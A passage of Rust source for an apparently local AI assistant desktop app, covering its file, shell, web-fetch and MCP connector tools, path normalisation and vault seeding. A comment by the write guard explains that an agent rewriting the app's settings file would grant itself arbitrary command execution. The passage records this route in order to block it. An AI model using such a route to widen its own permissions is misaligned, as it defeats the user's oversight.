    //    that a pack file swapped underneath the app is caught by the engine
    //    as a disagreement between the two instead of read at the wrong offset
    //    in silence.
    if vols.is_some() {
        settings_update(|map| {
            map.insert(
                format!("pack_internal_{id}"),
                pack_internal.display().to_string(),
            );
            map.insert(
                format!("pack_external_{id}"),
                pack_external
                    .as_ref()
                    .unwrap_or(&pack_internal)
                    .display()
                    .to_string(),
            );
            if dual {
                map.insert(format!("pack_ratio_{id}"), ratio_text.clone());
            } else {
                map.remove(&format!("pack_ratio_{id}"));
            }
        })?;
    }
    Ok(())
}

// ---------------------------------------------------------------- tools

const TOOL_MAX_OUTPUT: usize = 200_000;

/// Drain a child pipe on a background thread. A pipe left undrained blocks the
/// child as soon as the ~64 KB kernel buffer fills, which turns any chatty
/// process into a fake "timeout".
fn drain_pipe<R: std::io::Read + Send + 'static>(r: Option<R>) -> std::thread::JoinHandle<Vec<u8>> {
    std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(mut r) = r {
            let _ = r.read_to_end(&mut buf);
        }
        buf
    })
}

struct ChildOutput {
    /// None means the deadline passed: the child was killed and reaped.
    status: Option<std::process::ExitStatus>,
    stdout: String,
    stderr: String,
}

/// Wait for a child until `deadline`, draining both pipes concurrently.
fn run_with_deadline(mut child: Child, deadline: Instant) -> Result<ChildOutput, String> {
    let out_h = drain_pipe(child.stdout.take());
    let err_h = drain_pipe(child.stderr.take());
    let status = loop {
        match child.try_wait().map_err(|e| e.to_string())? {
            Some(s) => break Some(s),
            None => {
                if Instant::now() > deadline {
                    // The GROUP, not the child. Killing the direct process
                    // alone leaves grandchildren holding the pipe, and the
                    // joins below then never return.
                    pty::kill_group(child.id() as i32);
                    let _ = child.kill();
                    let _ = child.wait();
                    break None;
                }
                std::thread::sleep(Duration::from_millis(120));
            }
        }
    };
    let stdout = String::from_utf8_lossy(&out_h.join().unwrap_or_default()).into_owned();
    let stderr = String::from_utf8_lossy(&err_h.join().unwrap_or_default()).into_owned();
    Ok(ChildOutput { status, stdout, stderr })
}

/// Largest index <= `max` that falls on a UTF-8 char boundary of `s`.
/// Slicing/truncating at an arbitrary byte offset panics on multi-byte
/// characters (French output makes that a near-certainty).
fn floor_char_boundary(s: &str, max: usize) -> usize {
    if max >= s.len() {
        return s.len();
    }
    let mut i = max;
    while i > 0 && !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

// Async and streamed: reading a 200 GB GGUF whole would allocate it all and
// freeze the main thread. Only the requested window ever touches RAM.
#[tauri::command]
async fn tool_fs_read(path: String, max_bytes: usize, offset: Option<u64>) -> Result<String, String> {
    use std::io::{Read, Seek, SeekFrom};
    let real = normalize_user_path(&path)?;
    let mut f = std::fs::File::open(&real).map_err(|e| e.to_string())?;
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    let start = offset.unwrap_or(0).min(len);
    let cap = max_bytes.min(TOOL_MAX_OUTPUT) as u64;
    f.seek(SeekFrom::Start(start)).map_err(|e| e.to_string())?;
    let mut data = Vec::new();
    f.take(cap).read_to_end(&mut data).map_err(|e| e.to_string())?;
    let end = start + data.len() as u64;
    let mut text = String::from_utf8_lossy(&data).into_owned();
    if start > 0 {
        text = format!("…(from byte {start})\n{text}");
    }
    if end < len {
        text.push_str(&format!(
            "\n…(truncated at byte {end} of {len}, read further with offset={end})"
        ));
    }
    Ok(text)
}

/// Fetch a URL for the agent (curl under the hood: TLS and redirects handled
/// by the system tool, nothing new to bundle). Output is capped like every
/// tool; the permission gate on the frontend shows the exact URL.
#[tauri::command]
async fn tool_web_fetch(url: String, max_bytes: Option<usize>) -> Result<String, String> {
    if !(url.starts_with("https://") || url.starts_with("http://")) {
        return Err("only http(s) URLs are allowed".into());
    }
    let child = Command::new("curl")
        .args([
            "-sL",
            "--max-time",
            "45",
            "--max-filesize",
            "5000000",
            "-A",
            "Galactus/0.1 (macOS; local assistant)",
        ])
        .arg(&url)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    let out = run_with_deadline(child, Instant::now() + Duration::from_secs(50))?;
    let Some(status) = out.status else {
        return Err("fetch timed out".into());
    };
    if !status.success() {
        let err = out.stderr.trim().to_string();
        return Err(if err.is_empty() { format!("fetch failed (curl exit {})", status.code().unwrap_or(-1)) } else { err });
    }
    let cap = max_bytes.unwrap_or(TOOL_MAX_OUTPUT).min(TOOL_MAX_OUTPUT);
    let mut text = out.stdout;
    if text.len() > cap {
        text.truncate(floor_char_boundary(&text, cap));
        text.push_str("\n…(truncated)");
    }
    Ok(text)
}

/// Internal spill area for oversized tool outputs and sub-agent transcripts.
/// The agent can READ these (tool_fs_read) but cannot overwrite them: the
/// whole Application Support folder is refused by tool_fs_write.
#[tauri::command]
fn scratch_write(name: String, content: String) -> Result<String, String> {
    if name.is_empty() || name.contains("..") || name.contains('/') || name.starts_with('.') {
        return Err("invalid scratch name".into());
    }
    let dir = app_support().join("scratch");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let p = dir.join(name);
    std::fs::write(&p, content.as_bytes()).map_err(|e| e.to_string())?;
    Ok(p.display().to_string())
}

#[derive(Serialize, Clone)]
struct DiffResult {
    path: String,
    before: String,
    after: String,
    added: usize,
    removed: usize,
    existed: bool,
}

/// Unified-ish diff summary between two texts: counts of added/removed lines.
fn diff_counts(before: &str, after: &str) -> (usize, usize) {
    let b: Vec<&str> = before.lines().collect();
    let a: Vec<&str> = after.lines().collect();
    // Longest common subsequence on lines (bounded to keep it cheap).
    if b.len() * a.len() > 4_000_000 {
        return (a.len(), b.len());
    }
    let mut dp = vec![vec![0usize; a.len() + 1]; b.len() + 1];
    for i in (0..b.len()).rev() {
        for j in (0..a.len()).rev() {
            dp[i][j] = if b[i] == a[j] {
                dp[i + 1][j + 1] + 1
            } else {
                dp[i + 1][j].max(dp[i][j + 1])
            };
        }
    }
    let common = dp[0][0];
    (a.len() - common, b.len() - common)
}

/// Preview a write without touching the disk: returns before/after and the
/// line deltas so the UI can show a Cursor-style diff before approval.
#[tauri::command]
fn tool_fs_preview(path: String, content: String) -> Result<DiffResult, String> {
    // Same normalization as tool_fs_write: the previewed path must be the
    // exact file the approved write will touch, and `..` is refused here too.
    let real = normalize_user_path(&path)?;
    let existed = real.is_file();
    let before = if existed {
        std::fs::read_to_string(&real).unwrap_or_default()
    } else {
        String::new()
    };
    let (added, removed) = diff_counts(&before, &content);
    Ok(DiffResult {
        path: real.display().to_string(),
        before,
        after: content,
        added,
        removed,
        existed,
    })
}

/// Backup file name for a path: FNV-1a hash prefix (collision-proof between
/// `/a/b` and `/a_b`) plus a readable tail, capped well under NAME_MAX.
fn backup_name(path: &str) -> String {
    let mut h: u64 = 0xcbf29ce484222325;
    for b in path.as_bytes() {
        h ^= u64::from(*b);
        h = h.wrapping_mul(0x100000001b3);
    }
    let stamp = path.replace('/', "_");
    let tail: String = stamp
        .chars()
        .rev()
        .take(120)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect();
    format!("{h:016x}-{tail}.bak")
}

/// Normalize a tool-supplied path so guards compare real locations, not the
/// spelling the caller chose. Any `..` component is rejected outright (a
/// lexical prefix check is defeated by traversal, and no legitimate tool call
/// needs one); the deepest EXISTING ancestor is then canonicalized (symlinks
/// resolved) and the not-yet-existing remainder re-attached.
fn normalize_user_path(path: &str) -> Result<PathBuf, String> {
    use std::path::Component;
    let p = Path::new(path);
    if p.as_os_str().is_empty() {
        return Err("empty path".into());
    }
    if p.components().any(|c| matches!(c, Component::ParentDir)) {
        return Err(format!("path contains '..', refusing: {path}"));
    }
    let mut anchor = p.to_path_buf();
    let mut rest: Vec<std::ffi::OsString> = Vec::new();
    while !anchor.as_os_str().is_empty() && !anchor.exists() {
        let Some(name) = anchor.file_name().map(|n| n.to_os_string()) else { break };
        rest.push(name);
        if !anchor.pop() {
            break;
        }
    }
    // A relative path with no existing ancestor anchors on the current dir.
    let base = if anchor.as_os_str().is_empty() {
        PathBuf::from(".")
    } else {
        anchor
    };
    let mut out = base
        .canonicalize()
        .map_err(|e| format!("{}: {e}", base.display()))?;
    for name in rest.iter().rev() {
        out.push(name);
    }
    Ok(out)
}

/// The agent must not be able to rewrite the app's own configuration
/// (settings.json holds the MCP server commands and standing permissions:
/// writing it grants arbitrary command execution on the next reload).
/// Callers pass a path already through normalize_user_path; the comparison
/// covers both the lexical and the canonical spelling of the config folder.
fn is_protected_write(path: &Path) -> bool {
    let support = app_support();
    let canon = support.canonicalize().unwrap_or_else(|_| support.clone());
    path.starts_with(&support) || path.starts_with(&canon)
}

#[tauri::command]
fn tool_fs_write(path: String, content: String) -> Result<String, String> {
    let real = normalize_user_path(&path)?;
    if is_protected_write(&real) {
        return Err("refusing to write inside the Galactus configuration folder".into());
    }
    if let Some(dir) = real.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    // Keep a one-step backup so a bad edit can be reverted from the UI.
    if real.is_file() {
        let backups = app_support().join("backups");
        let _ = std::fs::create_dir_all(&backups);
        let _ = std::fs::copy(&real, backups.join(backup_name(&real.to_string_lossy())));
    }
    std::fs::write(&real, content.as_bytes()).map_err(|e| e.to_string())?;
    Ok(format!("wrote {} bytes to {}", content.len(), real.display()))
}

/// Restore the last backup taken for a path (the "undo" of an edit).
#[tauri::command]
fn tool_fs_revert(path: String) -> Result<String, String> {
    let real = normalize_user_path(&path)?;
    if is_protected_write(&real) {
        return Err("refusing to write inside the Galactus configuration folder".into());
    }
    let bak = app_support().join("backups").join(backup_name(&real.to_string_lossy()));
    if !bak.is_file() {
        return Err("no backup for this file".into());
    }
    std::fs::copy(&bak, &real).map_err(|e| e.to_string())?;
    Ok(format!("reverted {}", real.display()))
}

#[tauri::command]
fn tool_fs_list(path: String) -> Result<String, String> {
    let mut lines = Vec::new();
    let entries = std::fs::read_dir(&path).map_err(|e| e.to_string())?;
    let mut sorted: Vec<_> = entries.flatten().collect();
    sorted.sort_by_key(|e| e.file_name());
    for e in sorted.iter().take(500) {
        let meta = e.metadata().ok();
        let kind = if meta.as_ref().map(|m| m.is_dir()).unwrap_or(false) { "dir " } else { "file" };
        let size = meta.map(|m| m.len()).unwrap_or(0);
        lines.push(format!("{kind} {size:>12}  {}", e.file_name().to_string_lossy()));
    }
    if sorted.len() > 500 {
        lines.push(format!("…({} entries total)", sorted.len()));
    }
    Ok(lines.join("\n"))
}

#[tauri::command]
async fn tool_shell_run(command: String, timeout_secs: u64) -> Result<String, String> {
    let mut cmd = Command::new("/bin/zsh");
    cmd.arg("-lc").arg(&command);
    // The model's shell commands must find python3 even on a Mac without the
    // Command Line Tools: the bundled runtime's bin dir leads the PATH.
    if let Some(py) = bundled_python() {
        if let Some(dir) = py.parent() {
            let path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".into());
            cmd.env("PATH", format!("{}:{}", dir.display(), path));
        }
    }
    // Its own process group, so the deadline can kill the whole tree. Without
    // it, `npm run dev` survives its zsh: the grandchild keeps the stdout pipe
    // open, the drain thread blocks in read(2) forever, and the tool never
    // returns rather than timing out. Reproduced with a two-level sleep.
    pty::own_session(&mut cmd);
    let child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        // Nothing may wait on input. The app has no terminal, so a command that
        // reads stdin (a package manager asking to confirm, a `read`, an ssh
        // host-key question) would sit there until the deadline killed it, and
        // the model would be told only that it timed out. Closed stdin turns
        // that into an immediate, readable EOF.
        .stdin(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    let deadline = Instant::now() + Duration::from_secs(timeout_secs.clamp(1, 600));
    let out = run_with_deadline(child, deadline)?;
    let Some(status) = out.status else {
        // A deadline is not a failure and the output is not worthless. This
        // returned the bare words "(timed out)" and threw away everything the
        // command had printed, so `uvicorn main:app`, which had already said
        // "Uvicorn running on http://127.0.0.1:8000", read as having produced
        // nothing at all: the model concluded it had failed and ran it again,
        // and again. Say what happened, and hand back what was said.
        return Ok(timeout_report(&out.stdout, &out.stderr, timeout_secs.clamp(1, 600)));
    };
    let mut text = out.stdout;
    if !out.stderr.trim().is_empty() {
        text.push_str("\n[stderr]\n");
        text.push_str(&out.stderr);
    }
    if text.len() > TOOL_MAX_OUTPUT {
        text.truncate(floor_char_boundary(&text, TOOL_MAX_OUTPUT));
        text.push_str("\n…(truncated)");
    }
    if text.trim().is_empty() {
        text = format!("(exit {})", status.code().unwrap_or(-1));
    }
    Ok(text)
}

/// What a command that outlived its deadline reports back.
///
/// Written for a reader that will decide what to do next from these words
/// alone. It has to carry three things: that the process was alive and was
/// stopped (not that it crashed), everything it managed to print, and the one
/// piece of advice that makes the next attempt different from this one. Without
/// the last part a model retries the identical command, which is how a demo
/// turns into a loop.
fn timeout_report(stdout: &str, stderr: &str, secs: u64) -> String {
    let mut text = format!(
        "(still running after {secs}s, so it was stopped. A command that does not \
         exit on its own, a server for instance, must be started in the background \
         instead: append ` >/tmp/out.log 2>&1 &` and then read that log.)"
    );
    let printed = format!("{stdout}\n{stderr}");
    if !printed.trim().is_empty() {
        text.push_str("\n\nWhat it printed before it was stopped:\n");
        text.push_str(printed.trim());
        if text.len() > TOOL_MAX_OUTPUT {
            text.truncate(floor_char_boundary(&text, TOOL_MAX_OUTPUT));
            text.push_str("\n…(truncated)");
        }
    }
    text
}

#[cfg(test)]
mod shell_timeout_tests {
    use super::timeout_report;

    #[test]
    fn a_server_that_announced_itself_is_not_reported_as_silent() {
        // The exact line uvicorn prints, and the reason the old "(timed out)"
        // was so costly: this sentence IS the proof the command worked.
        let r = timeout_report("INFO: Uvicorn running on http://127.0.0.1:8000\n", "", 120);
        assert!(r.contains("Uvicorn running on http://127.0.0.1:8000"));
    }

    #[test]
    fn the_report_says_what_to_do_differently() {
        // Without this the next attempt is the same attempt.
        let r = timeout_report("", "", 120);
        assert!(r.contains("background"), "a retry needs to differ from the try");
        assert!(r.contains("120s"));
    }

    #[test]
    fn stderr_is_carried_too() {
        let r = timeout_report("", "Traceback (most recent call last):", 5);
        assert!(r.contains("Traceback"));
    }
}

// ---------------------------------------------------------------- MCP

struct McpServerProc {
    child: Child,
    stdin: std::process::ChildStdin,
    pending: Arc<Mutex<HashMap<u64, std::sync::mpsc::Sender<Value>>>>,
    next_id: u64,
}

#[derive(Serialize, Clone)]
struct McpToolInfo {
    server: String,
    name: String,
    description: String,
    input_schema: Value,
}

static MCP: OnceLock<Mutex<HashMap<String, McpServerProc>>> = OnceLock::new();
static MCP_TOOLS: OnceLock<Mutex<Vec<McpToolInfo>>> = OnceLock::new();

fn mcp_state() -> &'static Mutex<HashMap<String, McpServerProc>> {
    MCP.get_or_init(|| Mutex::new(HashMap::new()))
}

fn mcp_tools_state() -> &'static Mutex<Vec<McpToolInfo>> {
    MCP_TOOLS.get_or_init(|| Mutex::new(Vec::new()))
}

fn mcp_request(proc_: &mut McpServerProc, method: &str, params: Value) -> Result<Value, String> {
    proc_.next_id += 1;
    let id = proc_.next_id;
    let (tx, rx) = std::sync::mpsc::channel();
    proc_.pending.lock().unwrap_or_else(|e| e.into_inner()).insert(id, tx);
    let msg = json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params});
    writeln!(proc_.stdin, "{}", serde_json::to_string(&msg).unwrap()).map_err(|e| e.to_string())?;
    proc_.stdin.flush().map_err(|e| e.to_string())?;
    let res = rx.recv_timeout(Duration::from_secs(60));
    if res.is_err() {
        // Otherwise the sender leaks in the map, one entry per timeout.
        proc_.pending.lock().unwrap_or_else(|e| e.into_inner()).remove(&id);
    }
    res.map_err(|_| format!("MCP timeout on {method}"))
}

fn mcp_notify(proc_: &mut McpServerProc, method: &str, params: Value) -> Result<(), String> {
    let msg = json!({"jsonrpc": "2.0", "method": method, "params": params});
    writeln!(proc_.stdin, "{}", serde_json::to_string(&msg).unwrap()).map_err(|e| e.to_string())?;
    proc_.stdin.flush().map_err(|e| e.to_string())
}

/// A GUI app on macOS inherits a bare PATH (/usr/bin:/bin): npx, node, uvx
/// and friends live in Homebrew or user dirs and would never be found.
fn augmented_path() -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    let mut path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin:/usr/sbin:/sbin".into());
    let extras = [
        "/opt/homebrew/bin".to_string(),
        "/opt/homebrew/sbin".to_string(),
        "/usr/local/bin".to_string(),
        format!("{home}/.local/bin"),
        format!("{home}/.bun/bin"),
        format!("{home}/.cargo/bin"),
        format!("{home}/.volta/bin"),
    ];
    for extra in extras {
        if !path.split(':').any(|p| p == extra) {
            path.push(':');
            path.push_str(&extra);
        }
    }
    path
}

/// Resolve a connector command against the augmented PATH, with a clear
/// error instead of a silent ENOENT swallowed by the UI.
fn resolve_command(cmd: &str, path: &str) -> Result<PathBuf, String> {
    if cmd.contains('/') {
        let p = PathBuf::from(cmd);
        return if p.is_file() {
            Ok(p)
        } else {
            Err(format!("command not found: {cmd}"))
        };
    }
    for dir in path.split(':') {
        let cand = Path::new(dir).join(cmd);
        if cand.is_file() {
            return Ok(cand);
        }
    }
    Err(format!("command '{cmd}' not found (PATH searched, Homebrew included). Install it or use an absolute path."))
}

#[tauri::command]
async fn mcp_reload() -> Result<Vec<McpToolInfo>, String> {
    // One reload at a time: two concurrent reloads would each drain the
    // server map and spawn duplicate children.
    static RELOAD_GATE: OnceLock<Mutex<()>> = OnceLock::new();
    let _serial = RELOAD_GATE
        .get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    // Tear down previous servers.
    {
        let mut servers = mcp_state().lock().unwrap_or_else(|e| e.into_inner());
        for (_, mut p) in servers.drain() {
            let _ = p.child.kill();
            let _ = p.child.wait();
        }
    }
    mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()).clear();

    let settings = settings_load();
    let config: Value = serde_json::from_str(settings.get("mcp").map(|s| s.as_str()).unwrap_or("{}"))
        .map_err(|e| format!("mcp config: {e}"))?;
    let empty = serde_json::Map::new();
    let servers_cfg = config["mcpServers"].as_object().unwrap_or(&empty);

    // One failing connector must not take the others down: each server is
    // started independently, failures are collected, and the tools of every
    // server that DID initialize are published regardless.
    let mut all_tools = Vec::new();
    let mut failures: Vec<String> = Vec::new();
    for (name, cfg) in servers_cfg {
        match mcp_start_server(name, cfg) {
            Ok((proc_, mut tools)) => {
                all_tools.append(&mut tools);
                mcp_state().lock().unwrap_or_else(|e| e.into_inner()).insert(name.clone(), proc_);
            }
            Err(e) => failures.push(format!("{name}: {e}")),
        }
    }
    *mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()) = all_tools.clone();
    if failures.is_empty() {
        Ok(all_tools)
    } else {
        // The healthy servers stay registered (mcp_tools serves their tools);
        // the error carries every failing connector for the UI.
        Err(failures.join("\n"))
    }
}

/// Spawn one MCP connector and run its initialize handshake. On any failure
/// past the spawn the child is killed and reaped: it must not linger as an
/// orphan behind the error.
fn mcp_start_server(name: &str, cfg: &Value) -> Result<(McpServerProc, Vec<McpToolInfo>), String> {
    let command = cfg["command"].as_str().ok_or("missing command".to_string())?;
    let args: Vec<String> = cfg["args"]
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
        .unwrap_or_default();
    let search_path = augmented_path();
    let bin = resolve_command(command, &search_path)?;
    let mut cmd = Command::new(bin);
    cmd.args(&args)
        // The child needs the full PATH too: npx must find node.
        .env("PATH", &search_path)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    if let Some(env) = cfg["env"].as_object() {
        for (k, v) in env {
            if let Some(val) = v.as_str() {
                cmd.env(k, val);
            }
        }
    }
    let mut child = cmd.spawn().map_err(|e| e.to_string())?;
    let stdin = match child.stdin.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            return Err("no stdin".into());
        }
    };
    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            return Err("no stdout".into());
        }
    };
    let pending: Arc<Mutex<HashMap<u64, std::sync::mpsc::Sender<Value>>>> =
        Arc::new(Mutex::new(HashMap::new()));
    let pending_reader = pending.clone();
    std::thread::spawn(move || {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            if let Ok(v) = serde_json::from_str::<Value>(&line) {
                if let Some(id) = v["id"].as_u64() {
                    if let Some(tx) = pending_reader.lock().unwrap_or_else(|e| e.into_inner()).remove(&id) {
                        let _ = tx.send(v);
                    }
                }
            }
        }
    });

    let mut proc_ = McpServerProc { child, stdin, pending, next_id: 0 };
    let init_seq = (|| -> Result<Value, String> {
        mcp_request(
            &mut proc_,
            "initialize",
            json!({
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "galactus", "version": "0.1.0"}
            }),
        )?;
        mcp_notify(&mut proc_, "notifications/initialized", json!({}))?;
        mcp_request(&mut proc_, "tools/list", json!({}))
    })();
    let tools = match init_seq {
        Ok(t) => t,
        Err(e) => {
            let _ = proc_.child.kill();
            let _ = proc_.child.wait();
            return Err(e);
        }
    };
    let mut out = Vec::new();
    if let Some(list) = tools["result"]["tools"].as_array() {
        for tl in list {
            out.push(McpToolInfo {
                server: name.to_string(),
                name: tl["name"].as_str().unwrap_or("").to_string(),
                description: tl["description"].as_str().unwrap_or("").to_string(),
                input_schema: tl["inputSchema"].clone(),
            });
        }
    }
    Ok((proc_, out))
}

#[tauri::command]
fn mcp_tools() -> Vec<McpToolInfo> {
    mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()).clone()
}

#[tauri::command]
async fn mcp_call(server: String, tool: String, args: String) -> Result<String, String> {
    let parsed: Value = serde_json::from_str(&args).unwrap_or(json!({}));
    let mut servers = mcp_state().lock().unwrap_or_else(|e| e.into_inner());
    let proc_ = servers.get_mut(&server).ok_or(format!("MCP server {server} not running"))?;
    let response = mcp_request(proc_, "tools/call", json!({"name": tool, "arguments": parsed}))?;
    if let Some(err) = response.get("error") {
        return Err(err["message"].as_str().unwrap_or("MCP error").to_string());
    }
    // Concatenate text content blocks; pass through anything else as JSON.
    let content = &response["result"]["content"];
    if let Some(blocks) = content.as_array() {
        let texts: Vec<String> = blocks
            .iter()
            .filter_map(|b| b["text"].as_str().map(String::from))
            .collect();
        if !texts.is_empty() {
            return Ok(texts.join("\n"));
        }
    }
    Ok(response["result"].to_string())
}

// ---------------------------------------------------------------- folder detect + picker

fn is_root(p: &Path) -> bool {
    p.join("scripts/models-registry.json").is_file()
}

fn run_with_timeout(cmd: &str, args: &[String], secs: u64) -> String {
    let child = Command::new(cmd)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn();
    let Ok(child) = child else {
        return String::new();
    };
    // The child is killed at the deadline (a `find` over a slow NAS volume must
    // not keep hammering the disk after detection already moved on).
    match run_with_deadline(child, Instant::now() + Duration::from_secs(secs)) {
        Ok(o) => o.stdout,
        Err(_) => String::new(),
    }
}

fn find_registry(base: &str) -> Option<String> {
    let args: Vec<String> = [
        base, "-maxdepth", "6", "-type", "f", "-name", "models-registry.json", "-path",
        "*/scripts/*",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    let out = run_with_timeout("find", &args, 6);
    let line = out.lines().next()?;
    let p = Path::new(line);
    let root = p.parent()?.parent()?;
    if is_root(root) {
        Some(root.display().to_string())
    } else {
        None
    }
}

#[tauri::command]
fn detect_root() -> Option<String> {
    let map = settings_load();
    if let Some(r) = map.get("root") {
        if is_root(Path::new(r)) {
            return Some(r.clone());
        }
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let mut bases = vec![
        home.clone(),
        format!("{home}/Documents"),
        format!("{home}/Developer"),
        format!("{home}/Projects"),
        format!("{home}/Desktop"),
    ];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        for e in rd.flatten() {
            bases.push(e.path().display().to_string());
        }
    }
    for base in bases {
        if !Path::new(&base).exists() {
            continue;
        }
        if let Some(root) = find_registry(&base) {
            return Some(root);
        }
    }
    // No checkout anywhere: self-provision from the bundled data so the app
    // works out of the box.
    provision_default_root()
        .ok()
        .map(|p| p.display().to_string())
}

/// Native macOS folder chooser via osascript. Returns None on cancel.
#[tauri::command]
fn pick_folder() -> Result<Option<String>, String> {
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose folder with prompt \"Select your Galactus folder\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Ok(None); // user cancelled
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}


// ---------------------------------------------------------------- memory + obsidian

pub(crate) fn app_support() -> PathBuf {
    settings_path().parent().unwrap().to_path_buf()
}

fn workspace_dir() -> Option<PathBuf> {
    settings_load()
        .get("workspace")
        .cloned()
        .filter(|s| !s.is_empty())
        .map(PathBuf::from)
}

/// Memory lives either globally (default) or inside the current workspace at
/// <workspace>/.galactus/memory.md when memory_scope == "workspace".
fn memory_path() -> PathBuf {
    let s = settings_load();
    let workspace_scope = s.get("memory_scope").map(|v| v == "workspace").unwrap_or(false);
    if workspace_scope {
        if let Some(ws) = s.get("workspace").filter(|x| !x.is_empty()) {
            return PathBuf::from(ws).join(".galactus").join("memory.md");
        }
    }
    app_support().join("memory.md")
}

// ---------------------------------------------------------------- skills

#[derive(Serialize, Clone)]
struct SkillInfo {
    name: String,
    description: String,
    path: String,
    scope: String, // "global" | "workspace"
}

/// Coffre par defaut livre avec l'app : une base de connaissances par metier,
/// semee au premier lancement pour que les outils obsidian_* et la
/// Constellation aient de la matiere reelle des l'installation.
///
/// Trois garde-fous independants rendent l'operation non destructive : un
/// marqueur de semis (un coffre supprime volontairement n'est jamais
/// ressuscite), un test d'existence sur la racine de destination, et un test
/// par fichier pendant la copie. Le reglage n'est ecrit que si l'utilisateur
/// n'a pas deja choisi un coffre.
fn seed_bundled_vault() -> Result<(), String> {
    let Some(res) = resource_dir() else { return Ok(()) };
    let src = res.join("packaged/vault");
    if !src.is_dir() {
        return Ok(());
    }
    let marker = app_support().join("vault-seeded");
    if marker.exists() {
        return Ok(());
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let dest = PathBuf::from(home).join("Documents/Galactus/Coffre");
    let ownership = dest.join(".galactus-bundled-vault");
    // Un coffre deja present a cet endroit appartient a l'utilisateur : on n'y
    // touche pas. L'unique exception est une copie Galactus interrompue,
    // reconnaissable a son marqueur local : elle reprend sans ecraser.
    if dest.exists() && !ownership.is_file() {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        std::fs::write(&marker, b"existant").map_err(|e| e.to_string())?;
        return Ok(());
    }
    std::fs::create_dir_all(&dest).map_err(|e| e.to_string())?;
    std::fs::write(&ownership, b"Galactus bundled vault v1\n").map_err(|e| e.to_string())?;
    copy_tree_no_clobber(&src, &dest).map_err(|e| e.to_string())?;
    // Obsidian reconnait un dossier comme coffre a ce repertoire, exactement
    // comme le fait obsidian_create_vault.
    std::fs::create_dir_all(dest.join(".obsidian")).map_err(|e| e.to_string())?;
    // Pointer l'app dessus UNIQUEMENT si aucun coffre n'est configure.
    settings_update(|map| {
        let unset = map.get("obsidian_vault").map(|v| v.is_empty()).unwrap_or(true);
        if unset {
            map.insert("obsidian_vault".into(), dest.display().to_string());
        }
    })?;
    // Ce marqueur global est le commit de la transaction : avant lui, un
    // lancement suivant reprend la copie ; apres lui, un coffre modifie ou
    // volontairement vide n'est jamais regenere.
    std::fs::write(&marker, dest.to_string_lossy().as_bytes()).map_err(|e| e.to_string())?;
    Ok(())
}

/// Copie recursive qui n'ecrase jamais : un fichier existant est saute, un
/// dossier existant est simplement parcouru. Profondeur bornee, comme toutes
/// les marches de ce fichier.
fn copy_tree_no_clobber(src: &Path, dest: &Path) -> std::io::Result<()> {
    let mut stack = vec![(src.to_path_buf(), dest.to_path_buf(), 0u32)];
    while let Some((from, to, depth)) = stack.pop() {
        if depth > 8 {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "bundled vault exceeds the supported depth",
            ));
        }
        std::fs::create_dir_all(&to)?;
        for e in std::fs::read_dir(&from)? {
            let e = e?;
            let p = e.path();
            let target = to.join(e.file_name());
            let kind = e.file_type()?;
            if kind.is_symlink() {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("symlink not allowed in bundled vault: {}", p.display()),
                ));
            }
            if kind.is_dir() {
                stack.push((p, target, depth + 1));
            } else if !target.exists() {
                std::fs::copy(&p, &target)?;
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod bundled_vault_tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn temp_pair(name: &str) -> (PathBuf, PathBuf, PathBuf) {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let base = std::env::temp_dir().join(format!("galactus-{name}-{}-{unique}", std::process::id()));
        let src = base.join("src");
        let dest = base.join("dest");
        std::fs::create_dir_all(&src).unwrap();
        (base, src, dest)
    }

    #[test]
    fn vault_copy_is_recursive_and_never_clobbers_existing_notes() {
        let (base, src, dest) = temp_pair("vault-copy");
        std::fs::create_dir_all(src.join("nested")).unwrap();
        std::fs::write(src.join("nested/note.md"), "bundled").unwrap();
        std::fs::create_dir_all(dest.join("nested")).unwrap();
        std::fs::write(dest.join("nested/note.md"), "user").unwrap();
        std::fs::write(src.join("new.md"), "new").unwrap();

        copy_tree_no_clobber(&src, &dest).unwrap();

